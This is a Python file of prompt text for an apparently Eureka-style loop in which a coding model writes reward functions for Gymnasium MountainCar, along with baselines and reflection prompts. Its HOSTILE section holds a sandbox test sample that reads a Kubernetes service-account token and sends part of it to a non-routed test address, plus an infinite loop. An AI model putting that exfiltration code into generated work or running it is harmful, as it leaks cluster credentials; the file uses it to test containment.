"""What the model sees: the task, the reward signature, the baselines, and the reflection.

Eureka (Ma et al., 2023) gives a coding model the environment's source and a task description,
asks it for several reward functions at once, trains a policy with each, and feeds the training
statistics of the best one back into the next round. This file holds the text of that loop.
"""

import json

# {{docs-fragment task}}
TASK = """\
Environment: Gymnasium MountainCar-v0. An underpowered car sits in a valley between two hills
and must reach the flag on top of the right hill. Its engine is too weak to drive straight up,
so it has to rock back and forth to build momentum.

Observation, a numpy array of two float32 values:
  obs[0]  position, in [-1.2, 0.6]. The valley floor is near -0.52. The flag is at 0.5.
  obs[1]  velocity, in [-0.07, 0.07]. Positive is to the right.
Actions: 0 = push left, 1 = no push, 2 = push right.
Dynamics, per step:
  velocity += (action - 1) * 0.001 - 0.0025 * cos(3 * position), clipped to [-0.07, 0.07]
  position += velocity, clipped to [-1.2, 0.6]. At the left wall the velocity is set to 0.
An episode terminates when position >= 0.5, and is cut off after 200 steps.

The environment's own reward is -1 on every step, which gives a policy no signal until it
reaches the flag by chance. Almost no random policy ever does.

Task metric: the share of evaluation episodes in which a greedy policy reaches the flag. Each
reward function trains a PPO policy for a fixed, small budget of environment steps, on several
seeds, and is ranked by the mean task metric over the seeds. The policy is never graded on your
reward, only on the task metric.
"""

SIGNATURE = """\
Write a Python function with exactly this signature:

    def compute_reward(obs, action, next_obs, terminated):
        ...
        return total_reward, {"term_name": term_value, ...}

- obs and next_obs are numpy arrays of shape (2,); action is an int; terminated is True when
  next_obs reached the flag.
- Return a float and a dict that breaks the float into its named terms. The dict is how you
  get feedback on each term after training.
- `np` (numpy) and `math` are already imported. Do not import anything else, read files, or
  use the network. The function runs once per environment step, so keep it cheap.
"""
# {{/docs-fragment task}}

SYSTEM = """\
You are a reward engineer for reinforcement learning. You write dense, well-shaped reward
functions that make a policy learn the intended task quickly with a standard algorithm, and
that cannot be satisfied without solving the task. Prefer simple terms with physical meaning
and sensible scales. Each candidate you write should try a genuinely different idea."""

# {{docs-fragment baselines}}
# Two baselines, run with the same budget as every candidate: the environment's own reward,
# and a reward a person would write after reading the dynamics (mechanical energy gain).
SPARSE = """\
def compute_reward(obs, action, next_obs, terminated):
    return -1.0, {"step": -1.0}
"""

HUMAN = """\
def compute_reward(obs, action, next_obs, terminated):
    # Mechanical energy: kinetic plus potential, both scaled to [0, 1].
    def energy(o):
        return 0.5 * (o[1] / 0.07) ** 2 + (np.sin(3 * o[0]) + 1) / 2
    gain = 10.0 * (energy(next_obs) - energy(obs))
    goal = 10.0 if terminated else 0.0
    return gain + goal - 0.01, {"energy_gain": gain, "goal": goal, "step": -0.01}
"""
# {{/docs-fragment baselines}}

# {{docs-fragment hostile}}
# Model-written code is untrusted. These two stand in for the candidates that go wrong: one
# never returns, and one tries to read the pod's credentials and call out to the network.
# They run in generation 1 with everything else, and the sandbox stops both. The network call
# goes to 192.0.2.1 (TEST-NET-1, never routed), so nothing leaves even if the sandbox failed.
HOSTILE = {
    "never_returns": """\
def compute_reward(obs, action, next_obs, terminated):
    while True:
        pass
""",
    "exfiltrates": """\
import os, urllib.request
token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()
urllib.request.urlopen("http://192.0.2.1/?t=" + token[:8], timeout=3)
def compute_reward(obs, action, next_obs, terminated):
    return 0.0, {}
""",
}
# {{/docs-fragment hostile}}


# {{docs-fragment prompt}}
def proposal_prompt(num_candidates: int, history: list[dict]) -> str:
    """The user message for one generation: the task, then the reflection on the last best."""
    parts = [TASK, SIGNATURE, f"Write {num_candidates} different candidate reward functions."]
    if history:
        # Elitist: reflect on the best reward so far, so a weak generation cannot drag the
        # search backwards.
        best = max(history, key=lambda h: (h["success"], -h["steps"]))
        parts.append(
            f"Here is the best reward function so far (from generation {best['generation']}), and what "
            "happened when policies were trained with it:\n\n"
            f"```python\n{best['code']}\n```\n\n{reflection(best)}\n\n"
            "Analyze the feedback: which terms helped, which were too small, too large, or "
            "constant, and why the policy did or did not reach the flag. Then write improved "
            "candidates. You may rewrite the reward entirely."
        )
        last = history[-1]["scoreboard"]
        parts.append("Every candidate of the last generation, with its task metric:\n" + "\n".join(
            f"- {name}: {success:.0%}{'' if outcome == 'trained' else f' ({outcome})'}. {idea}"
            for name, idea, success, outcome in last))
        scores = ", ".join(f"generation {h['generation']}: {h['success']:.0%}" for h in history)
        parts.append(f"Best task metric so far, by generation: {scores}.")
    return "\n\n".join(parts)


def reflection(result: dict) -> str:
    """Eureka's reward reflection: the task metric and every term, early and late in training."""
    lines = [
        f"Task metric (flag reached, mean over {result['seeds']} seeds): {result['success']:.0%}",
        f"Per seed: {', '.join(f'{s:.0%}' for s in result['per_seed'])}",
        f"Mean highest position reached in evaluation: {result['best_pos']:.2f} (flag at 0.50)",
    ]
    for name, v in result["components"].items():
        early = "n/a" if v["early"] is None else f"{v['early']:.4f}"
        late = "n/a" if v["late"] is None else f"{v['late']:.4f}"
        lines.append(f"Term {name}: mean per step {early} early in training, {late} late")
    if result.get("error"):
        lines.append(f"The reward failed: {result['error']}")
    return "\n".join(lines)
# {{/docs-fragment prompt}}


# Structured output: Claude returns exactly this JSON, so there is nothing to parse by hand.
CANDIDATES_SCHEMA = {
    "type": "object",
    "properties": {
        "candidates": {
            "type": "array",
            "items": {
                "type": "object",
                "properties": {
                    "name": {"type": "string", "description": "snake_case, at most 4 words"},
                    "idea": {"type": "string", "description": "one sentence"},
                    "code": {"type": "string", "description": "the full compute_reward function"},
                },
                "required": ["name", "idea", "code"],
                "additionalProperties": False,
            },
        },
    },
    "required": ["candidates"],
    "additionalProperties": False,
}


def as_json(obj) -> str:
    return json.dumps(obj, sort_keys=True)
